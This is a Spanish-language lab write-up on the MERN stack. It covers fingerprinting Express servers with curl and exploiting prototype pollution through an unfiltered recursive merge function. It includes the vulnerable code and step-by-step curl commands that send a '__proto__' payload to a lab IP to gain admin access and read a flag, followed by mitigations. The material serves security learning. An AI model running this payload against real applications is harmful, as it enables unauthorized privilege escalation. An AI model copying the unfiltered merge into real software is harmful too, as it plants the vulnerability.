# 🧱 Modern Web Stacks — MERN Stack & Prototype Pollution

> **Módulo:** Modern Web Stacks · 
> **Tags:** #web #mern #nodejs #express #prototype-pollution #pentesting  
> **Estado:** ✅ Completado

---

## 🤔 ¿Qué es un "Stack"?

Un **stack** (pila) es simplemente el **conjunto de tecnologías** que una aplicación web usa de principio a fin.

Imagínalo como los ingredientes de una receta: igual que una pizza lleva masa, salsa, queso y toppings, una app web lleva una base de datos, un servidor, y una interfaz.

```
[Usuario en el navegador]
        ↓
  [Frontend → React]        ← lo que ves
        ↓
  [Backend → Express/Node]  ← lógica del servidor
        ↓
  [Base de datos → MongoDB] ← donde se guardan los datos
```

Cuando todas las capas usan el **mismo lenguaje (JavaScript)**, eso es el stack MERN.

---

## 🔠 ¿Qué significa MERN?

| Letra | Tecnología | Qué hace |
|-------|-----------|----------|
| **M** | MongoDB | Base de datos (guarda los datos) |
| **E** | Express.js | Framework web que corre en Node.js |
| **R** | React | Lo que el usuario ve en el navegador |
| **N** | Node.js | El motor que ejecuta JavaScript en el servidor |

> 💡 **Analogía simple:** Node es el motor del carro, Express es el volante, MongoDB es el maletero, y React es la carrocería que el pasajero ve.

---

## 🕵️ Identificar un servidor MERN (Fingerprinting)

Antes de atacar, necesitas confirmar con qué tecnología estás tratando. Se hace con `curl -I`:

```bash
curl -I 10.64.153.145:3000
```

### Señales que revelan que es Express/MERN:

| Señal | Valor | Confianza |
|-------|-------|-----------|
| Header `X-Powered-By` | `Express` | 🔴 Alta |
| Header `Set-Cookie` | `connect.sid=s%3A...` | 🔴 Alta |
| Ruta no existente | `Cannot GET /nonexistent` (texto plano) | 🔴 Alta |
| Elemento raíz HTML | presente en el body | 🟡 Media |

```bash
# Confirmar la huella de ruta no manejada
curl http://10.64.153.145:3000/nonexistent
# Respuesta esperada de Express:
# <pre>Cannot GET /nonexistent</pre>
```

> ⚠️ **Nota:** Si `X-Powered-By` no aparece, el desarrollador usó `app.disable('x-powered-by')` o el middleware Helmet. Usa las otras señales como respaldo.

---

## 🎯 Superficie de Ataque en MERN

Las apps MERN exponen APIs JSON. Los endpoints más comunes e interesantes son los de **actualización de perfil/usuario**, porque los desarrolladores suelen escribir funciones de fusión (`merge`) sin filtrar las claves.

### Endpoints relevantes en esta sala:

| Endpoint | Método | Descripción |
|----------|--------|-------------|
| `/api/user/update` | POST | Acepta JSON y lo fusiona al objeto de sesión del usuario |
| `/api/admin/flag` | GET | Devuelve la flag si el usuario tiene `isAdmin: true` |

---

## ☠️ Prototype Pollution — El Ataque

### ¿Qué es el prototipo en JavaScript?

En JavaScript, **todos los objetos heredan de `Object.prototype`**. Piénsalo como un "objeto padre" global del que todos los demás objetos heredan propiedades.

```
Objeto normal: { nombre: "Skye" }
       ↓ hereda de
Object.prototype: { isAdmin: undefined, toString: ..., ... }
```

Si logras **escribir en `Object.prototype`**, esa propiedad aparece en **TODOS los objetos** del proceso de Node.js.

### ¿Por qué es vulnerable esta app?

La función `merge` en el servidor no filtra claves peligrosas:

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);  // ← recursión sin filtro
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

Cuando recibe `{"__proto__": {"isAdmin": true}}`:
1. Itera sobre las claves del JSON
2. Encuentra `__proto__` → lo trata como un objeto normal
3. `target["__proto__"]` apunta a `Object.prototype`
4. Escribe `isAdmin: true` **directamente en `Object.prototype`**
5. Ahora **cualquier objeto** del proceso tiene `isAdmin = true` al recorrer la cadena

### El endpoint de admin:

```javascript
app.get('/api/admin/flag', (req, res) => {
  const currentUser = req.session.currentUser || {};
  if (currentUser.isAdmin) {   // ← busca la propiedad en la cadena de prototipos
    res.json({ flag: '[REDACTED]' });
  } else {
    res.status(403).json({ error: 'Not authorized' });
  }
});
```

Como `currentUser.isAdmin` no existe en el objeto de sesión, JavaScript sube por la cadena hasta `Object.prototype` y encuentra `isAdmin: true` → devuelve la flag.

---

## 🔥 Explotación Paso a Paso

### Paso 0 — Verificar que el endpoint de admin está restringido

```bash
curl -c cookies.txt http://10.64.153.145:3000/
curl -b cookies.txt http://10.64.153.145:3000/api/admin/flag
# {"error":"Not authorized"}  ← esperado
```

### Paso 1 — Enviar el payload de Prototype Pollution

```bash
curl -b cookies.txt -X POST http://10.64.153.145:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
# {"status":"updated"}  ← la fusión se ejecutó
```

### Paso 2 — Solicitar la flag de administrador

```bash
curl -b cookies.txt http://10.64.153.145:3000/api/admin/flag
# {"flag":"[REDACTED]"}  ← Object.prototype.isAdmin = true en todo el proceso
```

---

## 🧩 Resumen Visual del Ataque

```
[Atacante]
    │
    │  POST /api/user/update
    │  {"__proto__": {"isAdmin": true}}
    ▼
[Servidor Express]
    │
    │  merge(userObj, payload)
    │  target["__proto__"] === Object.prototype
    │  Object.prototype.isAdmin = true  ← CONTAMINADO
    ▼
[GET /api/admin/flag]
    │
    │  currentUser.isAdmin
    │  → no en objeto propio
    │  → sube cadena de prototipos
    │  → Object.prototype.isAdmin = true  ✅
    ▼
[flag devuelta]
```

---

## 🛡️ ¿Cómo se mitiga?

- Filtrar claves peligrosas: `__proto__`, `constructor`, `prototype`
- Usar `Object.create(null)` para objetos sin prototipo
- Usar `JSON.parse` con validación de esquema (ej. Joi, Zod)
- Middleware Helmet para ocultar headers de Express
- Implementaciones modernas de merge como `lodash >= 4.17.21` (ya parcheado)

---

## 📌 Takeaways

> - Un **stack** es el conjunto de tecnologías de una app (frontend + backend + DB).
> - El **stack MERN** usa JavaScript en todas las capas.
> - Express se identifica por el header `X-Powered-By: Express` y la cookie `connect.sid`.
> - **Prototype Pollution** ocurre cuando una función `merge` no filtra `__proto__`.
> - Al contaminar `Object.prototype`, la propiedad se hereda en **todos** los objetos del proceso Node.js.
> - El ataque se ejecuta con un simple `curl` enviando `{"__proto__": {"isAdmin": true}}`.
